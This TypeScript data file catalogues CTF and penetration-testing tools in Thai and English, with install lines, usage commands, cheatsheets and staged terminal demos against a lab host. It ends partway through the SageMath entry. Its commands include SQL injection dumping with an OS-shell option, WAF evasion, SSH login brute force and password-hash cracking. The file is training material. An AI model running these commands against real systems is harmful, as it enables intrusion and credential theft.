import type { Tool } from "./types";

// Curated arsenal. Featured tools carry full bilingual guides + a live terminal
// demo; lighter entries still give a tagline, install line and official link.
export const tools: Tool[] = [
  // ───────────────────────────── RECON / OSINT ─────────────────────────────
  {
    id: "nmap", name: "Nmap", category: "recon", difficulty: 2, featured: true, installed: true,
    tagline: { th: "สแกนพอร์ตและบริการ มาตรฐานของวงการ", en: "The industry-standard port & service scanner" },
    description: {
      th: "Nmap ยิงแพ็กเก็ตไปยังเป้าหมายเพื่อค้นหาพอร์ตที่เปิด ระบุบริการและเวอร์ชัน เดา OS และรันสคริปต์ตรวจช่องโหว่ (NSE) เป็นก้าวแรกของแทบทุกการทดสอบเจาะระบบ",
      en: "Nmap probes a target to discover open ports, fingerprint services and versions, guess the OS, and run vulnerability scripts (NSE). It is the first step of almost every engagement.",
    },
    notes: {
      th: "ในสนาม CTF สาย network เริ่มด้วย `-sC -sV` เกือบทุกครั้ง ถ้าเจอพอร์ตแปลกให้ใช้ `-p-` สแกนครบ 65535 พอร์ต แล้วเจาะเฉพาะจุด อย่าลืมว่า `-A` ดังและช้า",
      en: "For network CTFs start with `-sC -sV` almost every time. If a box hides services, sweep all 65535 ports with `-p-` then target the interesting ones. Remember `-A` is loud and slow.",
    },
    official: "https://nmap.org/book/man.html", repo: "https://github.com/nmap/nmap",
    platforms: ["macOS", "Linux", "Windows"],
    install: ["brew install nmap", "sudo apt install nmap"],
    usage: [
      { cmd: "nmap -sC -sV -oN scan.txt <ip>", desc: { th: "สแกนเริ่มต้น: สคริปต์ default + เวอร์ชัน บันทึกผล", en: "Default scan: default scripts + versions, saved" } },
      { cmd: "nmap -p- --min-rate 5000 <ip>", desc: { th: "สแกนครบทุกพอร์ตแบบเร็ว", en: "Fast full-port sweep" } },
      { cmd: "nmap --script vuln <ip>", desc: { th: "รันสคริปต์ตรวจช่องโหว่", en: "Run vulnerability scripts" } },
      { cmd: "nmap -sU --top-ports 50 <ip>", desc: { th: "สแกน UDP 50 พอร์ตยอดนิยม", en: "Scan top 50 UDP ports" } },
    ],
    cheatsheet: [
      "-sC -sV   default scripts + version detection",
      "-p-       all 65535 ports    |   -p 80,443 specific",
      "-A        aggressive (OS, scripts, traceroute) — loud",
      "-oN/-oX/-oG  save normal / XML / grepable output",
      "-Pn       skip host discovery (treat as up)",
      "--script=<cat>  http-enum, vuln, smb-* …",
    ],
    tags: ["scan", "port", "service", "nse", "discovery"],
    demo: {
      title: { th: "สแกนหาพอร์ตและบริการ", en: "Discover ports & services" },
      prompt: "kali@ctf",
      steps: [
        { comment: "recon step 1 — what is running on the box?" },
        { cmd: "nmap -sC -sV -oN scan.txt 10.10.11.42",
          out: "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.11.42\nHost is up (0.021s latency).\n\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    nginx 1.18.0\n|_http-title: CTF Arsenal Demo\n3306/tcp open  mysql   MySQL 8.0.32\n\nService detection performed. Nmap done: 1 IP (1 host up) scanned in 12.4s" },
        { comment: "80 open → next stop is web fuzzing (ffuf)" },
      ],
    },
  },
  {
    id: "amass", name: "OWASP Amass", category: "recon", difficulty: 2, installed: false,
    tagline: { th: "แผนที่ subdomain และ ASN แบบลึก", en: "Deep subdomain & ASN mapping" },
    description: { th: "รวบรวม subdomain จากหลายแหล่ง (DNS, cert, scraping) เพื่อวาดพื้นผิวโจมตีของโดเมน", en: "Aggregates subdomains from many sources (DNS, certs, scraping) to map a domain's attack surface." },
    official: "https://github.com/owasp-amass/amass", install: ["brew install amass"],
    tags: ["subdomain", "dns", "osint", "asn"],
  },
  {
    id: "theharvester", name: "theHarvester", category: "recon", difficulty: 1, installed: false,
    tagline: { th: "เก็บอีเมล ชื่อ subdomain จากแหล่งเปิด", en: "Harvest emails, names & subdomains from OSINT" },
    description: { th: "ค้นอีเมล ชื่อพนักงาน และ subdomain จาก search engine และแหล่งสาธารณะ เหมาะกับ recon ช่วงแรก", en: "Finds emails, employee names and subdomains from search engines and public sources — great for early recon." },
    official: "https://github.com/laramies/theHarvester", install: ["pipx install theHarvester"],
    tags: ["email", "osint", "subdomain"],
  },
  {
    id: "subfinder", name: "subfinder", category: "recon", difficulty: 1, installed: false,
    tagline: { th: "หา subdomain เร็วจาก passive source", en: "Fast passive subdomain discovery" },
    description: { th: "เครื่องมือจาก ProjectDiscovery ที่ดึง subdomain จาก API หลายแหล่งอย่างรวดเร็ว", en: "ProjectDiscovery tool that pulls subdomains from many passive sources, fast." },
    official: "https://github.com/projectdiscovery/subfinder", install: ["brew install subfinder"],
    tags: ["subdomain", "passive"],
  },

  // ───────────────────────────── WEB APPLICATION ─────────────────────────────
  {
    id: "ffuf", name: "ffuf", category: "web", difficulty: 2, featured: true, installed: true,
    tagline: { th: "ยิง fuzz เว็บเร็วสุดขั้ว หาไฟล์/พารามิเตอร์ซ่อน", en: "Blazing-fast web fuzzer for hidden files & params" },
    description: {
      th: "ffuf (Fuzz Faster U Fool) ยิงคำจาก wordlist ไปยังตำแหน่ง FUZZ ใน URL เพื่อค้นไดเรกทอรี ไฟล์ subdomain พารามิเตอร์ หรือค่าที่ซ่อนอยู่ รองรับ filter ตาม status/size/word",
      en: "ffuf (Fuzz Faster U Fool) sprays wordlist entries into a FUZZ marker in the URL to discover directories, files, subdomains, parameters or hidden values, with filtering by status/size/words.",
    },
    notes: {
      th: "เคล็ดลับ: เจอ 200 เยอะเกินไปให้ `-fs` กรองตามขนาด response ที่ซ้ำ ถ้า fuzz พารามิเตอร์ POST ใช้ `-d 'FUZZ=x' -X POST` และอย่าลืม `-mc all` ตอนสำรวจ",
      en: "Tip: if you get a wall of 200s, filter by the repeated response size with `-fs`. To fuzz POST params use `-d 'FUZZ=x' -X POST`, and use `-mc all` while exploring.",
    },
    official: "https://github.com/ffuf/ffuf/wiki", repo: "https://github.com/ffuf/ffuf",
    platforms: ["macOS", "Linux", "Windows"],
    install: ["brew install ffuf", "go install github.com/ffuf/ffuf/v2@latest"],
    usage: [
      { cmd: "ffuf -w list.txt -u https://site/FUZZ", desc: { th: "ค้นไดเรกทอรี/ไฟล์", en: "Directory / file discovery" } },
      { cmd: "ffuf -w list.txt -u https://FUZZ.site -mc 200", desc: { th: "ค้น subdomain (vhost)", en: "Subdomain / vhost discovery" } },
      { cmd: "ffuf -w list.txt -u https://site/?FUZZ=1 -fs 0", desc: { th: "ค้นพารามิเตอร์ที่ซ่อน", en: "Hidden parameter discovery" } },
      { cmd: "ffuf -w u.txt:U -w p.txt:P -u https://s/login -d 'user=U&pass=P' -X POST", desc: { th: "brute login สองลิสต์", en: "Two-list login brute force" } },
    ],
    cheatsheet: [
      "-w list.txt          wordlist   (:KEY for named)",
      "-u URL with FUZZ     injection point",
      "-mc 200,301  match codes   |  -fc 404 filter codes",
      "-fs <n>  filter size   |  -fw <n> filter words",
      "-e .php,.txt         append extensions",
      "-H 'Cookie: x=y'     add header   |  -X POST",
      "-recursion -recursion-depth 2",
    ],
    tags: ["fuzz", "directory", "bruteforce", "vhost", "parameter"],
    demo: {
      title: { th: "หาไดเรกทอรีที่ซ่อนอยู่", en: "Find hidden directories" },
      prompt: "kali@ctf",
      steps: [
        { cmd: "ffuf -w common.txt -u http://10.10.11.42/FUZZ -mc 200,301 -fs 1256",
          out: "\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/   v2.1.0\n\n:: Method           : GET\n:: Matcher          : Response status: 200,301\n________________________________________________\n\nadmin                   [Status: 301, Size: 169]\nbackup                  [Status: 200, Size: 4210]\nrobots.txt              [Status: 200, Size: 42]\nuploads                 [Status: 301, Size: 169]\n:: Progress: [4614/4614] :: Job [1/1] :: 892 req/sec" },
        { comment: "/backup looks juicy — go read it" },
      ],
    },
  },
  {
    id: "sqlmap", name: "sqlmap", category: "web", difficulty: 2, featured: true, installed: true,
    tagline: { th: "ตรวจและเจาะ SQL injection อัตโนมัติ", en: "Automated SQL injection detection & exploitation" },
    description: {
      th: "sqlmap ทดสอบพารามิเตอร์เว็บอัตโนมัติว่ามี SQL injection หรือไม่ ถ้ามีก็ดึงฐานข้อมูล ตาราง คอลัมน์ ไปจนถึงอ่านไฟล์หรือรันคำสั่งได้ รองรับหลาย DBMS และเทคนิค",
      en: "sqlmap automatically tests web parameters for SQL injection and, when found, dumps databases, tables and columns — up to reading files or running commands. Supports many DBMS and techniques.",
    },
    notes: {
      th: "เก็บ request จาก Burp เป็นไฟล์แล้วป้อน `-r req.txt` แม่นกว่าพิมพ์ URL เอง เริ่มที่ `--batch --level 2 --risk 2` ก่อน ถ้าเจอให้ `--dump` เฉพาะตารางที่ต้องการ อย่ายิงเว็บที่ไม่ได้รับอนุญาต",
      en: "Save a request from Burp and feed it with `-r req.txt` — more reliable than typing URLs. Start at `--batch --level 2 --risk 2`; once found, `--dump` only the table you need. Never point it at systems you are not authorised to test.",
    },
    official: "https://github.com/sqlmapproject/sqlmap/wiki", repo: "https://github.com/sqlmapproject/sqlmap",
    platforms: ["macOS", "Linux", "Windows"],
    install: ["brew install sqlmap", "pipx install sqlmap"],
    usage: [
      { cmd: "sqlmap -u 'https://site/item?id=1' --batch", desc: { th: "ทดสอบพารามิเตอร์เดียว", en: "Test a single parameter" } },
      { cmd: "sqlmap -r req.txt --batch --dbs", desc: { th: "ใช้ request จาก Burp แล้วลิสต์ DB", en: "Use a Burp request, list databases" } },
      { cmd: "sqlmap -r req.txt -D shop -T users --dump", desc: { th: "ดึงตาราง users", en: "Dump the users table" } },
    ],
    cheatsheet: [
      "-u URL | -r req.txt      target",
      "--batch                  accept defaults (no prompts)",
      "--level 1-5 --risk 1-3   depth of tests",
      "--dbs / --tables / --columns / --dump",
      "-D db -T tbl -C col      scope the dump",
      "--os-shell               try command execution",
      "--tamper=space2comment   WAF evasion",
    ],
    tags: ["sqli", "injection", "database", "dump"],
    demo: {
      title: { th: "เจาะ SQL injection แล้วดึงข้อมูล", en: "Exploit SQLi and dump data" },
      prompt: "kali@ctf",
      steps: [
        { cmd: "sqlmap -u 'http://10.10.11.42/item?id=1' --batch --dbs",
          out: "        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.8.9}\n|_ -| . [']     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] testing connection to the target URL\n[*] parameter 'id' is 'MySQL >= 5.6 boolean-based blind' injectable\n[*] the back-end DBMS is MySQL\n\navailable databases [2]:\n[*] information_schema\n[*] ctf" },
        { cmd: "sqlmap -u 'http://10.10.11.42/item?id=1' --batch -D ctf -T flags --dump",
          out: "Database: ctf\nTable: flags\n[1 entry]\n+----+--------------------------+\n| id | value                    |\n+----+--------------------------+\n| 1  | CTT{sql1_dump3d_it_all}  |\n+----+--------------------------+" },
      ],
    },
  },
  {
    id: "gobuster", name: "Gobuster", category: "web", difficulty: 1, installed: true,
    tagline: { th: "brute directory/dns/vhost เขียนด้วย Go", en: "Go-powered directory / DNS / vhost brute-forcer" },
    description: { th: "ทางเลือกยอดนิยมของ dirb/dirbuster เร็วและเรียบง่าย เหมาะกับค้นไดเรกทอรีและ subdomain", en: "A fast, simple alternative to dirb/dirbuster for directory and subdomain discovery." },
    official: "https://github.com/OJ/gobuster", install: ["brew install gobuster"],
    usage: [
      { cmd: "gobuster dir -u https://site -w list.txt", desc: { th: "ค้นไดเรกทอรี", en: "Directory mode" } },
      { cmd: "gobuster dns -d site.com -w subs.txt", desc: { th: "ค้น subdomain", en: "DNS mode" } },
    ],
    tags: ["directory", "dns", "vhost", "bruteforce"],
    demo: { title: { th: "ค้นไดเรกทอรีด้วย Gobuster", en: "Directory scan with Gobuster" }, prompt: "kali@ctf", steps: [
      { cmd: "gobuster dir -u http://10.10.11.42 -w common.txt -q", out: "/admin                (Status: 301) [--> /admin/]\n/backup               (Status: 200) [Size: 4210]\n/robots.txt           (Status: 200) [Size: 42]\n/uploads              (Status: 301) [--> /uploads/]" },
      { comment: "/backup returned 200 — read it next" } ] },
  },
  {
    id: "feroxbuster", name: "feroxbuster", category: "web", difficulty: 1, installed: true,
    tagline: { th: "content discovery แบบ recursive เร็วมาก", en: "Fast recursive content discovery" },
    description: { th: "ยิงหาไฟล์/ไดเรกทอรีแบบ recursive อัตโนมัติ เขียนด้วย Rust", en: "Recursively brute-forces files and directories, written in Rust." },
    official: "https://github.com/epi052/feroxbuster", install: ["brew install feroxbuster"],
    tags: ["directory", "recursive", "bruteforce"],
  },
  {
    id: "nuclei", name: "Nuclei", category: "web", difficulty: 2, installed: true,
    tagline: { th: "สแกนช่องโหว่ด้วยเทมเพลตชุมชน", en: "Template-driven vulnerability scanner" },
    description: { th: "ยิงเทมเพลต YAML หลายพันตัวเพื่อตรวจช่องโหว่ CVE, misconfiguration, exposure อย่างรวดเร็ว", en: "Runs thousands of community YAML templates to detect CVEs, misconfigurations and exposures quickly." },
    official: "https://docs.projectdiscovery.io/tools/nuclei", install: ["brew install nuclei"],
    usage: [{ cmd: "nuclei -u https://site", desc: { th: "สแกนเป้าหมายด้วยเทมเพลตทั้งหมด", en: "Scan a target with all templates" } }],
    tags: ["scanner", "cve", "templates"],
    demo: { title: { th: "สแกนช่องโหว่ด้วยเทมเพลต", en: "Template vulnerability scan" }, prompt: "kali@ctf", steps: [
      { cmd: "nuclei -u http://10.10.11.42 -silent", out: "[git-config] [http] [medium] http://10.10.11.42/.git/config\n[exposed-env] [http] [high] http://10.10.11.42/.env\n[php-info] [http] [low] http://10.10.11.42/phpinfo.php" },
      { comment: "an exposed .git and .env — usually a quick win" } ] },
  },
  {
    id: "burp", name: "Burp Suite", category: "web", difficulty: 2, installed: true,
    tagline: { th: "proxy ตัดกลางสำหรับทดสอบเว็บ", en: "The intercepting proxy for web testing" },
    description: { th: "จับ แก้ และรีเพลย์ HTTP request ระหว่างเบราว์เซอร์กับเซิร์ฟเวอร์ มี Repeater, Intruder, Decoder ครบ", en: "Intercept, edit and replay HTTP between browser and server; includes Repeater, Intruder and Decoder." },
    official: "https://portswigger.net/burp/documentation", install: ["brew install --cask burp-suite"],
    tags: ["proxy", "intercept", "repeater", "intruder"],
  },
  {
    id: "httpx", name: "httpx", category: "web", difficulty: 1, installed: true,
    tagline: { th: "probe HTTP หลายโฮสต์พร้อมกัน", en: "Fast multi-host HTTP prober" },
    description: { th: "ตรวจว่าโฮสต์ไหนมีเว็บ ตอบสถานะอะไร ใช้เทคโนโลยีอะไร ในระดับหมื่นโฮสต์", en: "Checks which hosts serve HTTP, their status and tech, across tens of thousands of hosts." },
    official: "https://github.com/projectdiscovery/httpx", install: ["brew install httpx"],
    tags: ["http", "probe", "recon"],
  },
  {
    id: "wpscan", name: "WPScan", category: "web", difficulty: 1, installed: false,
    tagline: { th: "สแกนช่องโหว่ WordPress", en: "WordPress vulnerability scanner" },
    description: { th: "ตรวจปลั๊กอิน ธีม ผู้ใช้ และช่องโหว่ที่รู้จักของเว็บ WordPress", en: "Enumerates plugins, themes, users and known vulns of WordPress sites." },
    official: "https://github.com/wpscanteam/wpscan", install: ["gem install wpscan"],
    tags: ["wordpress", "scanner"],
  },

  // ───────────────────────────── CRYPTOGRAPHY ─────────────────────────────
  {
    id: "ctfid", name: "ctfid", category: "crypto", difficulty: 1, featured: true, installed: true,
    tagline: { th: "โยนอะไรใส่ก็บอกว่าคืออะไร + ถอดให้เลย", en: "Paste anything — it identifies and auto-decodes" },
    description: {
      th: "ctfid เป็นตัวช่วยประจำสนามที่เขียนขึ้นเอง: รับข้อความหรือไฟล์ แล้วระบุว่าเป็นแฮช, encoding, cipher, หรือชนิดไฟล์ จากนั้นไล่ถอดเป็นชั้น ๆ (base64/hex/rot/xor/gzip/morse/brainfuck ฯลฯ) จนกลายเป็นข้อความอ่านออกหรือเจอ flag พร้อมบอกด้วยว่าถ้าแก้ต่อควรใช้ tool ไหน",
      en: "ctfid is a home-grown field companion: give it a string or file and it identifies hashes, encodings, ciphers or file types, then peels decoders layer by layer (base64/hex/rot/xor/gzip/morse/brainfuck…) until it reaches readable text or a flag — and tells you which tool to reach for next.",
    },
    notes: {
      th: "จุดเด่นคือ 'how to solve' ที่บอก tool ต่อไป เช่นเจอ hash → hashcat, เจอ PNG → zsteg, เจอ RSA modulus → RsaCtfTool ใช้เป็นด่านแรกเสมอเมื่อไม่รู้ว่าไฟล์/สตริงคืออะไร",
      en: "Its highlight is the 'how to solve' block that names the next tool — hash → hashcat, PNG → zsteg, RSA modulus → RsaCtfTool. Use it as the first triage whenever you don't know what a string or file is.",
    },
    repo: "", platforms: ["macOS", "Linux"],
    install: ["# ships in ~/.local/bin/ctfid (pure Python, no deps)"],
    usage: [
      { cmd: "ctfid 'Q1RUe2g5fQ=='", desc: { th: "ระบุ + ถอดสตริง", en: "Identify + decode a string" } },
      { cmd: "ctfid suspicious.png", desc: { th: "โหมดไฟล์: magic/exif/binwalk/strings", en: "File mode: magic/exif/binwalk/strings" } },
      { cmd: "cat blob | ctfid", desc: { th: "อ่านจาก stdin", en: "Read from stdin" } },
      { cmd: "ctfid -q '<x>'", desc: { th: "ตอบอย่างเดียว (ใส่ในสคริปต์)", en: "Answer only (scriptable)" } },
    ],
    cheatsheet: [
      "ctfid <text>        identify + decode chain",
      "ctfid <file>        magic / exif / binwalk / strings",
      "ctfid               interactive REPL",
      "-q  answer only   -x  XOR analysis   -d N  depth",
      "REPL: :d N depth  :f file  :x xor  :zw zero-width  :q",
    ],
    tags: ["identify", "decode", "hash", "encoding", "cipher", "triage"],
    demo: {
      title: { th: "ระบุและถอดข้อความอัตโนมัติ", en: "Identify and auto-decode" },
      prompt: "ctf",
      steps: [
        { cmd: "ctfid 'Q1RUe2g5fQ=='",
          out: "== identified\n  [med]  Base64\n\n== how to solve\n  ✓ already decoded below\n\n== decode attempts\n  [##########]  base64  <-- FLAG\n      CTT{h9}\n\n== answer\n  CTT{h9}\n  via base64" },
        { cmd: "ctfid 5d41402abc4b2a76b9719d911017c592",
          out: "== identified\n  [high] Hash (32 hex chars)  MD5, NTLM, MD4, ...\n\n== how to solve\n  ✓ crack it: hashcat -m 0 hash.txt rockyou.txt | john --wordlist=rockyou.txt" },
      ],
    },
  },
  {
    id: "cyberchef", name: "CyberChef", category: "crypto", difficulty: 1, installed: false,
    tagline: { th: "“มีดสวิส” ของการเข้ารหัส/ถอดรหัส บนเบราว์เซอร์", en: "The cyber Swiss-army knife, in your browser" },
    description: { th: "ต่อ 'recipe' จากบล็อกหลายร้อยตัว (base64, XOR, AES, gzip, magic) เพื่อแปลงข้อมูลแบบเห็นผลทันที", en: "Chain hundreds of operations (base64, XOR, AES, gzip, magic) into a recipe and see the result live." },
    official: "https://gchq.github.io/CyberChef/", repo: "https://github.com/gchq/CyberChef",
    tags: ["encoding", "decode", "recipe", "web"],
  },
  {
    id: "rsactftool", name: "RsaCtfTool", category: "crypto", difficulty: 2, featured: true, installed: true,
    tagline: { th: "โจมตี RSA ที่ตั้งค่าอ่อนแบบครบสูตร", en: "Attack weak RSA every known way" },
    description: {
      th: "รวมการโจมตี RSA ไว้ในที่เดียว: n เล็กแฟกเตอร์ได้, e เล็ก, key ซ้ำ, Wiener, Hastad, Fermat และอีกมาก ป้อน public key หรือค่า n,e,c แล้วมันลองให้หมด",
      en: "Bundles the RSA attacks: small/factorable n, small e, shared factors, Wiener, Hastad, Fermat and more. Feed a public key or n,e,c and it tries them all.",
    },
    notes: {
      th: "ถ้ามีแค่ n ให้เช็ค factordb.com ก่อน มักโดนแฟกเตอร์ไว้แล้ว ป้อน `--publickey key.pem --private` เพื่อกู้ private key หรือ `--uncipher c` เพื่อถอด ciphertext ตรง ๆ",
      en: "With only n, check factordb.com first — it is often pre-factored. Use `--publickey key.pem --private` to recover the key, or `--uncipher c` to decrypt directly.",
    },
    official: "https://github.com/RsaCtfTool/RsaCtfTool", repo: "https://github.com/RsaCtfTool/RsaCtfTool",
    platforms: ["macOS", "Linux"], install: ["uv tool install git+https://github.com/RsaCtfTool/RsaCtfTool"],
    usage: [
      { cmd: "RsaCtfTool --publickey key.pem --private", desc: { th: "กู้ private key จาก public key", en: "Recover the private key" } },
      { cmd: "RsaCtfTool -n <n> -e <e> --uncipher <c>", desc: { th: "ถอด ciphertext จาก n,e,c", en: "Decrypt ciphertext from n,e,c" } },
      { cmd: "RsaCtfTool --publickey key.pem --attack wiener", desc: { th: "เลือกการโจมตีเฉพาะ", en: "Run a specific attack" } },
    ],
    cheatsheet: [
      "--publickey key.pem      load a public key",
      "--private                output a private key",
      "-n N -e E -c C           supply raw values",
      "--uncipher C             decrypt a ciphertext",
      "--attack wiener,hastad,fermat,factordb …",
      "--dumpkey                show n, e of a key",
    ],
    tags: ["rsa", "factor", "wiener", "attack"],
    demo: {
      title: { th: "กู้ private key จาก RSA อ่อนแอ", en: "Recover a key from weak RSA" },
      prompt: "ctf",
      steps: [
        { cmd: "RsaCtfTool --publickey weak.pem --private",
          out: "[*] Testing key weak.pem.\n[*] Performing factordb attack on weak.pem.\n[*] Attack success with factordb method !\n\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCx...snip...q3Y=\n-----END RSA PRIVATE KEY-----" },
        { cmd: "RsaCtfTool --publickey weak.pem --uncipher flag.enc",
          out: "[+] Clear text : CTT{w13n3r_w0uld_b3_pr0ud}" },
      ],
    },
  },
  {
    id: "hashcat", name: "hashcat", category: "password", difficulty: 3, featured: true, installed: true,
    tagline: { th: "แครกแฮชด้วย GPU เร็วที่สุดในโลก", en: "The world's fastest GPU password cracker" },
    description: {
      th: "hashcat เดารหัสจากแฮชด้วยพลัง GPU รองรับแฮชหลายร้อยชนิด ทำ dictionary, rule, mask (brute-force แบบมีแพทเทิร์น) และ combinator ได้",
      en: "hashcat recovers passwords from hashes using GPU power. It supports hundreds of hash types and dictionary, rule, mask (patterned brute-force) and combinator attacks.",
    },
    notes: {
      th: "หัวใจคือ `-m` (โหมดแฮช) กับ `-a` (โหมดโจมตี) หาโหมดแฮชด้วย `hashcat --example-hashes` หรือให้ ctfid/name-that-hash บอก บน mask: `?l?u?d?s` = อักษรเล็ก/ใหญ่/เลข/สัญลักษณ์",
      en: "The core is `-m` (hash mode) and `-a` (attack mode). Find the mode with `hashcat --example-hashes` or let ctfid/name-that-hash tell you. In masks `?l?u?d?s` = lower/upper/digit/symbol.",
    },
    official: "https://hashcat.net/wiki/", repo: "https://github.com/hashcat/hashcat",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install hashcat"],
    usage: [
      { cmd: "hashcat -m 0 -a 0 hash.txt rockyou.txt", desc: { th: "MD5 + dictionary", en: "MD5 + dictionary" } },
      { cmd: "hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule", desc: { th: "เพิ่ม rule ดัดคำ", en: "Add mangling rules" } },
      { cmd: "hashcat -m 0 -a 3 hash.txt '?l?l?l?l?d?d'", desc: { th: "mask brute-force", en: "Mask brute-force" } },
      { cmd: "hashcat -m 1000 hash.txt rockyou.txt", desc: { th: "แครก NTLM", en: "Crack NTLM" } },
    ],
    cheatsheet: [
      "-m 0 MD5  100 SHA1  1400 SHA256  1000 NTLM  3200 bcrypt",
      "-a 0 dict   -a 3 mask   -a 1 combinator",
      "?l lower ?u upper ?d digit ?s symbol ?a all",
      "-r rules/best64.rule    apply rules",
      "--show   print cracked   |   --status  live stats",
      "-O optimized   -w 3 workload",
    ],
    tags: ["hash", "crack", "gpu", "bruteforce", "mask"],
    demo: {
      title: { th: "แครกแฮช MD5 ด้วย wordlist", en: "Crack an MD5 with a wordlist" },
      prompt: "ctf",
      steps: [
        { cmd: "hashcat -m 0 -a 0 hash.txt rockyou.txt",
          out: "hashcat (v6.2.6) starting\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nRecovered........: 1/1 (100.00%) Digests" },
        { comment: "cracked: the password is 'password'" },
      ],
    },
  },
  {
    id: "john", name: "John the Ripper", category: "password", difficulty: 2, featured: true, installed: true,
    tagline: { th: "แครกรหัสอเนกประสงค์ + ชุด *2john", en: "Versatile cracker with the *2john toolkit" },
    description: {
      th: "John (jumbo) แครกรหัสจากแฮชได้หลากหลาย จุดเด่นคือชุดสคริปต์ `*2john` ที่แปลงไฟล์ (zip, pdf, ssh key, office) ให้กลายเป็นแฮชที่แครกได้",
      en: "John (jumbo) cracks a wide range of hashes. Its highlight is the `*2john` family that turns files (zip, pdf, ssh keys, office docs) into crackable hashes.",
    },
    notes: {
      th: "ไฟล์มีรหัส? ใช้ `zip2john secret.zip > h` แล้ว `john --wordlist=rockyou.txt h` ตามด้วย `john --show h` มี pdf2john, ssh2john, office2john, rar2john ครบ",
      en: "Password-protected file? `zip2john secret.zip > h` then `john --wordlist=rockyou.txt h` and `john --show h`. There's pdf2john, ssh2john, office2john, rar2john and more.",
    },
    official: "https://www.openwall.com/john/doc/", repo: "https://github.com/openwall/john",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install john-jumbo"],
    usage: [
      { cmd: "john --wordlist=rockyou.txt hash.txt", desc: { th: "dictionary attack", en: "Dictionary attack" } },
      { cmd: "zip2john secret.zip > h && john h", desc: { th: "แครกรหัส zip", en: "Crack a zip password" } },
      { cmd: "john --show hash.txt", desc: { th: "แสดงผลที่แครกได้", en: "Show cracked results" } },
    ],
    cheatsheet: [
      "--wordlist=FILE      dictionary mode",
      "--rules              apply mangling rules",
      "--format=NAME        force a hash format",
      "--show               show cracked passwords",
      "*2john: zip2john pdf2john ssh2john office2john rar2john",
    ],
    tags: ["hash", "crack", "zip", "pdf", "ssh"],
    demo: {
      title: { th: "แครกรหัสไฟล์ ZIP", en: "Crack a ZIP password" },
      prompt: "ctf",
      steps: [
        { cmd: "zip2john secret.zip > hash.txt", out: "secret.zip/flag.txt PKZIP Encr: cmplen=48, decmplen=36, crc=..." },
        { cmd: "john --wordlist=rockyou.txt hash.txt",
          out: "Using default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nhunter2          (secret.zip/flag.txt)\n1g 0:00:00:00 DONE" },
        { cmd: "john --show hash.txt", out: "secret.zip/flag.txt:hunter2\n\n1 password hash cracked, 0 left" },
      ],
    },
  },
  {
    id: "name-that-hash", name: "Name-That-Hash", category: "password", difficulty: 1, installed: true,
    tagline: { th: "บอกว่าแฮชนี้คือชนิดอะไร", en: "Identify what a hash is" },
    description: { th: "รับแฮชแล้วเดาชนิด พร้อมบอกโหมด hashcat และ John ที่ตรงกัน", en: "Takes a hash and guesses its type, with matching hashcat and John modes." },
    official: "https://github.com/HashPals/Name-That-Hash", install: ["uv tool install name-that-hash"],
    usage: [{ cmd: "nth -t <hash>", desc: { th: "ระบุชนิดแฮช", en: "Identify a hash" } }],
    tags: ["hash", "identify"],
    demo: { title: { th: "ระบุชนิดแฮช", en: "Identify a hash" }, prompt: "ctf", steps: [
      { cmd: "nth -t 5f4dcc3b5aa765d61d8327deb882cf99", out: "Most Likely\nMD5, HC: 0 JtR: raw-md5\nNTLM, HC: 1000 JtR: nt\nLM, HC: 3000 JtR: lm" },
      { comment: "32 hex → MD5 most likely; crack with hashcat -m 0" } ] },
  },
  {
    id: "hydra", name: "Hydra", category: "password", difficulty: 2, installed: true,
    tagline: { th: "brute-force ล็อกอินบริการเครือข่าย", en: "Brute-force network service logins" },
    description: { th: "เดารหัสผ่านของบริการอย่าง SSH, FTP, HTTP form, RDP ด้วยลิสต์ผู้ใช้/รหัส", en: "Guesses passwords for services like SSH, FTP, HTTP forms and RDP using user/password lists." },
    official: "https://github.com/vanhauser-thc/thc-hydra", install: ["brew install hydra"],
    usage: [{ cmd: "hydra -l admin -P rockyou.txt ssh://10.10.11.42", desc: { th: "brute SSH", en: "Brute SSH" } }],
    tags: ["bruteforce", "login", "ssh", "ftp"],
    demo: { title: { th: "brute-force ล็อกอิน SSH", en: "Brute-force an SSH login" }, prompt: "kali@ctf", steps: [
      { cmd: "hydra -l admin -P rockyou.txt ssh://10.10.11.42 -t 4", out: "[DATA] attacking ssh://10.10.11.42:22/\n[22][ssh] host: 10.10.11.42   login: admin   password: hunter2\n1 of 1 target successfully completed, 1 valid password found" },
      { comment: "admin:hunter2 — now ssh in" } ] },
  },
  {
    id: "xortool", name: "xortool", category: "crypto", difficulty: 2, installed: true,
    tagline: { th: "วิเคราะห์ XOR แบบ repeating-key", en: "Analyse repeating-key XOR" },
    description: { th: "เดาความยาว key ของ XOR แล้วกู้ key และ plaintext กลับมา", en: "Guesses the key length of a repeating-key XOR then recovers the key and plaintext." },
    official: "https://github.com/hellman/xortool", install: ["uv tool install xortool"],
    tags: ["xor", "crypto"],
    demo: { title: { th: "กู้ key ของ repeating-XOR", en: "Recover a repeating-XOR key" }, prompt: "ctf", steps: [
      { cmd: "xortool cipher.bin -c 20", out: "The most probable key lengths:\n   5:  18.2%\n  10:  12.1%\nProbable key length: 5\nProbable key: b'CTFXR'\n[+] Written to xortool_out/" },
      { comment: "key length 5, key CTFXR — plaintext is in xortool_out/" } ] },
  },
  {
    id: "sage", name: "SageMath", category: "crypto", difficulty: 3, installed: false,
    tagline: { th: "ระบบพีชคณิตสำหรับโจทย์ crypto หนัก ๆ", en: "Algebra system for heavy crypto challenges" },
